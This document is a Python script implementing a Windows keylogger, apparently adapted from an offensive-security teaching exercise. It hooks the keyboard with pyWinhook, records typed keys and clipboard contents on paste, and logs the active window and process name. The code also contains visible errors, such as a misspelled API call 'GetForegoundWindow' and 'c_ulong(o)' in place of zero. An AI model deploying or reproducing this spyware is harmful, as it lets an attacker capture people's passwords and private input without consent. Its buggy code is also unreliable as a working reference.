#!/usr/bin/env python3
from ctypes import *
import pythoncom
import pyWinhook as ph
import win32clipboard
import time

user32 = windll.user32
kernel32 = windll.kernel32
psapi = windll.psapi
current_window = None
previous_time = time.gmtime()


def get_str_value(psapi_obj):
    return '{}'.format(psapi_obj.value)


def get_current_process():
    '''
    Returns current process information as a string with PID, executable, title
    '''
    # Get a handle to the foreground window
    hwnd = user32.GetForegoundWindow()

    # Find the processID
    pid = c_ulong(o)
    user32.GetWindowThreadProcessId(hwnd, byref(pid))
    process_id = get_str_value(pid)

    # Grab the executable
    executable = create_string_buffer('\x00' * 512)
    h_process = kernel32.OpenProcess(0x400 | 0x10, False, pid)
    psapi.GetModuleBaseNameA(h_process, None, byref(executable), 512)
    executable_name = get_str_value(executable)

    # Read title of the current process
    window_title = create_string_buffer('\x00' * 512)
    user32.GetWindowTextA(hwnd, byref(window_title), 512)
    window_name = get_str_value(window_title)

    # Depending on the process, return the header
    return str(
        '\n'
        '[PID: {pid} - {executable} - {title} ]'
        '\n '.format(
            pid=process_id,
            executable=executable_name,
            title=window_name))


def KeyStroke(event):
    global current_window
    global previous_time

    # Check if target changed windows
    if event.WindowName != current_window:
        current_window = event.WindowName
        print(current_window)

    try:
        # Actions for standard keys
        if event.Ascii > 32 and event.Ascii < 127:
            print(chr(event.Ascii), end='', flush=True)
        elif event.Key == "V":
            win32clipboard.OpenClipboard()
            paste_val = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()

            print('[PASTE] - {val}'.format(val=paste_val), end='', flush=True)
        else:
            print('{key}'.format(key=event.Key), end='', flush=True)
    except Exception:
        pass
    # if (time.gmtime() - previous_time) > 7:
    #     previous_time = time.gmtime()
    #     return previous_time
    # else:
    #     return True


# Create and register a hook manager
try:
    kl = ph.HookManager()
    kl.KeyUp = KeyStroke

    kl.HookKeyboard()
    pythoncom.PumpMessages()
except Exception:
    pass
